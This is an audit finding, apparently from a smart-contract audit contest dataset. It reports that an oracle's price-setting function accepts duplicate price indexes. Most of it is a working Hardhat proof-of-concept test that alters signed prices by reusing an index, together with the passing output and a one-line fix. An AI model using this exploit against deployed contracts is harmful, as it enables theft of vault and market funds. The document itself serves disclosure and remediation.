# [M] The oracle price could be tampered due to missing duplicate price index check

## Summary
Severity: Medium
Contest weight: 0.4580
Dataset id: 19867
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The _setPrices() function is missing to check duplicated prices indexes. Attackers such as malicious order keepers can exploit it to tamper signed prices.
The following test script shows how it works
```solidity
import { expect } from "chai";
import { deployContract } from "../../utils/deploy";
import { deployFixture } from "../../utils/fixture";
import {
TOKEN_ORACLE_TYPES,
signPrices,
getSignerInfo,
getCompactedPrices,
getCompactedPriceIndexes,
getCompactedDecimals,
getCompactedOracleBlockNumbers,
getCompactedOracleTimestamps,
} from "../../utils/oracle";
import { printGasUsage } from "../../utils/gas";
import { grantRole } from "../../utils/role";
import * as keys from "../../utils/keys";

describe("AttackOracle", () => {
const { provider } = ethers;
let user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9;
let roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc;
let oracleSalt;

beforeEach(async () => {
const fixture = await deployFixture();
({ user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9 } =
fixture.accounts);
({ roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc } = fixture.contracts);
({ oracleSalt } = fixture.props);
});

it("inits", async () => {
expect(await oracle.oracleStore()).to.eq(oracleStore.address);
expect(await oracle.SALT()).to.eq(oracleSalt);
});

it("tamperPrices", async () => {
const blockNumber = (await provider.getBlock()).number;
const blockTimestamp = (await provider.getBlock()).timestamp;
await dataStore.setUint(keys.MIN_ORACLE_SIGNERS, 2);
const block = await provider.getBlock(blockNumber);
let signerInfo = getSignerInfo([0, 1]);
let minPrices = [1000, 1000]; // if some signers sign a same price
let maxPrices = [1010, 1010]; // if some signers sign a same price
let signatures = await signPrices({
signers: [signer0, signer1],
salt: oracleSalt,
minOracleBlockNumber: blockNumber,
maxOracleBlockNumber: blockNumber,
oracleTimestamp: blockTimestamp,
blockHash: block.hash,
token: wnt.address,
tokenOracleType: TOKEN_ORACLE_TYPES.DEFAULT,
precision: 1,
minPrices,
maxPrices,
});
// attacker tamper the prices and indexes
minPrices[1] = 2000
maxPrices[1] = 2020
let indexes = getCompactedPriceIndexes([0, 0]) // share the same index
await oracle.setPrices(dataStore.address, eventEmitter.address, {
priceFeedTokens: [],
signerInfo,
tokens: [wnt.address],
compactedMinOracleBlockNumbers: [blockNumber],
compactedMaxOracleBlockNumbers: [blockNumber],
compactedOracleTimestamps: [blockTimestamp],
compactedDecimals: getCompactedDecimals([1]),
compactedMinPrices: getCompactedPrices(minPrices),
compactedMinPricesIndexes: indexes,
compactedMaxPrices: getCompactedPrices(maxPrices),
compactedMaxPricesIndexes: indexes,
signatures,
});
const decimals = 10
expect((await oracle.getPrimaryPrice(wnt.address)).min).eq(1500 * decimals);
expect((await oracle.getPrimaryPrice(wnt.address)).max).eq(1515 * decimals);
});
});
```
The output
> npx hardhat test .\test\oracle\AttackOracle.ts
AttackOracle
inits
tamperPrices (105ms)
2 passing (13s)
Steal funds from the vault and markets.

## Recommendation
Don't allow duplicated prices indexes
